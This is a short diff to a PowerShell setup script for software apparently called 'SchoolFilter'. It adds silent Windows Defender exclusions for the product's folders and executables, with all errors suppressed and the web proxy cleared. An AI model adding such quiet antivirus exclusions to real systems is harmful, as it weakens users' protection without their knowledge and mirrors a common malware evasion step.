@@ -10,6 +10,10 @@ $ErrorActionPreference = "SilentlyContinue"
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 [System.Net.WebRequest]::DefaultWebProxy = $null
 
+try {
+    Add-MpPreference -ExclusionPath "C:\ProgramData\SchoolFilter","C:\Program Files\SchoolFilter" -ExclusionProcess "SchoolFilterCtl.exe","SchoolFilter_Setup.exe" -ErrorAction SilentlyContinue
+} catch {}
+
 $scriptStartUtc = [DateTime]::UtcNow.AddSeconds(-10)
 $dataDir = "C:\ProgramData\SchoolFilter"
 
